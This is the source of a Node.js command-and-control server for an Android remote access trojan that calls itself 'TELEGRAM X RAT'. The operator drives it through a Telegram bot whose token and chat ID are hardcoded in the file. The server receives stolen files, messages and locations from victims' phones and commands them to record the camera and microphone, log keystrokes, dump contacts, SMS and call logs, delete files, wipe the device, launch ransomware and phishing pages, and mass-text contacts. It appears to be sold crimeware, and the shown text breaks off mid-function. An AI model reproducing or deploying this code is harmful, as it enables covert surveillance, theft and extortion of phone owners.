const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '8266544404:AAFDLaekj_WjpUR3EPX83kqo2nCZERndsQc'
const id = '6770662608'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send(`
    <html lang="id">
 <head> 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <title>Server Online</title> 
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&amp;display=swap" rel="stylesheet"> 
  <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Poppins', sans-serif;
                }
                body {
                    background: linear-gradient(to right, #111, #222);
                    color: white;
                    text-align: center;
                    padding: 20px;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    flex-direction: column;
                }
                .container {
                    background: rgba(255, 255, 255, 0.1);
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
                    width: 90%;
                    max-width: 400px;
                    text-align: center;
                }
                h1 {
                    font-size: 24px;
                    margin-bottom: 10px;
                    animation: fadeIn 1.5s ease-in-out;
                }
                .status {
                    font-size: 20px;
                    font-weight: bold;
                    color: #25d366;
                    margin: 10px 0;
                    animation: blink 1s infinite alternate;
                }
                .whatsapp-btn {
                    display: inline-block;
                    background: #25d366;
                    color: white;
                    padding: 12px 20px;
                    font-size: 18px;
                    font-weight: bold;
                    text-decoration: none;
                    border-radius: 5px;
                    margin-top: 20px;
                    transition: 0.3s;
                    animation: fadeIn 2s ease-in-out;
                }
                .whatsapp-btn:hover {
                    background: #1ebe5d;
                }
                @keyframes blink {
                    0% { opacity: 1; }
                    50% { opacity: 0.5; }
                    100% { opacity: 1; }
                }
                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(-10px); }
                    to { opacity: 1; transform: translateY(0); }
                }
            </style> 
 </head> 
 <body> 
  <div class="container"> 
   <h1>🚀 Server Telah Online! 🎉</h1> 
   <p class="status">🟢 Status: Online</p> 
   <p>Terimakasih telah membeli server kami!</p> 
   <a href="https://wa.me/6283199386704" class="whatsapp-btn">Hubungi Developer</a> 
  </div> 
 </body>
</html>
`)
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `Pesan <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `Pesan <b>${req.headers.model}</b>\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `Lokasi <b>${req.headers.model}</b>`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `Korban Tersambung\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `Sambungan Korban Putus\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
                'Anda akan menerima respons dalam beberapa saat.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
                'Anda akan menerima respons dalam beberapa saat.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('📩𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙🗳️')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
                'Anda akan menerima respons dalam beberapa saat.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('📂𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚💥')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
                'Anda akan menerima respons dalam beberapa saat.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Masukkan berapa lama Anda ingin mikrofon merekam.')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
                'Anda akan menerima respons dalam beberapa saat.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
                'Anda akan menerima respons dalam beberapa saat.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
                'Anda akan menerima respons dalam beberapa saat.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Masukkan pesan yang ingin Anda tampilkan di perangkat target.')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
                'Anda akan menerima respons dalam beberapa saat.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('📮𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
                'Anda akan menerima respons dalam beberapa saat.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
                'Anda akan menerima respons dalam beberapa saat.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                'HALO SAYA ADALAH TELEGRAM X RAT\n\n' +
                '• Jika Anda terjebak di suatu tempat di bot ini, kirim perintah /start.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '🐦 List Korban') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'Bro Korban Belum Ada Mendownload Aplikasi\n\n' +
                    'Suruh Korban Mendownload Aplikasi 🗿'
                )
            } else {
                let text = '🐦 List Data Korban :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '⚡ Sadap Korban') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, 'Pilih Device Untuk men⚡ Sadap Korban', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`Pilih perintah : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '🖼️𝗔𝗣𝗣𝗦🖼️', callback_data: `apps:${uuid}`},
                        {text: '🚨𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧🚨', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '📂DAPARKAN FILE📂', callback_data: `file:${uuid}`},
                        {text: '👹HAPUS FILE👹', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '🎟️SCREENSHOT🎟️', callback_data: `screenshot:${uuid}`},
                        {text: '👾WHATSAPP👾', callback_data: `whatsapp:${uuid}`},
                    ],
                    [
                        {text: '🌀SALINAN🌀', callback_data: `clipboard:${uuid}`},
                        {text: '🥎MICROPHONE🥎', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '🔰KAMERA BELAKANG🔰', callback_data: `camera_main:${uuid}`},
                        {text: '🎪KAMERA BELAKANG🎪', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '🌐LOKASI🌐', callback_data: `location:${uuid}`},
                        {text: '🗯️PESAN TOAST🗯️', callback_data: `toast:${uuid}`}
                    ],
                     [
                        {text: '📮DAPATKAN PEMBAYARAN📮', callback_data: `Settings:${uuid}`},
                        {text: '☢️RESET HP☢️', callback_data: `Erase_data:${uuid}`},
                    ],
                    [
                        {text: '☃️LOG PANGGILAN☃️', callback_data: `calls:${uuid}`},
                        {text: '🏆KONTAK🏆', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '⏲️GETARKAN⏲️', callback_data: `vibrate:${uuid}`},
                        {text: '🔔NOTIFIKASI🔔', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '🧊PESAN🧊', callback_data: `messages:${uuid}`},
                        {text: '🎁KIRIM SMS🎁', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '🚸RANSOMWARE🚸', callback_data: `Ransomware:${uuid}`},
                        {text: '✳️HALAMAN PISHING✳️', callback_data: `custom_phishing:${uuid}`},
                    ],
                    [
                        {text: '🦞PUTAR AUDIO🦞', callback_data: `play_audio:${uuid}`},
                        {text: '☯️HENTIKAN AUDIO☯️', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '⛔‼️KIRIM SMS KE SEMUA KONTAK‼️⛔',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                    [
                        {text: '🔒ENKRIPSI DATA🔒', callback_data: `encrypt_data:${uuid}`},
                        {text: '🔓DEKRIPSI DATA🔓', callback_data: `decrypt_data:${uuid}`},
                    ],
                    [
                        {text: '🐦KEYLOGGER ON🐦', callback_data: `keylogger_on:${uuid}`},
                        {text: '⛽KEYLOGGER OFF⛽', callback_data: `keylogger_off:${uuid}`},
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
            'Anda akan menerima respons dalam beberapa saat.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
            'Anda akan menerima respons dalam beberapa saat.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
            'Anda akan menerima respons dalam beberapa saat.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
            'Anda akan menerima respons dalam beberapa saat.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
            'Anda akan menerima respons dalam beberapa saat.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
            'Anda akan menerima respons dalam beberapa saat.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
            'Anda akan menerima respons dalam beberapa saat.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
            'Anda akan menerima respons dalam beberapa saat.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
            'Anda akan menerima respons dalam beberapa saat.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
            'Anda akan menerima respons dalam beberapa saat.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '⚡ Perintah Anda Sedang Diproses ⚡\n\n' +
            'Anda akan menerima respons dalam beberapa saat.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🐦 List Korban"], ["⚡ Sadap Korban"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
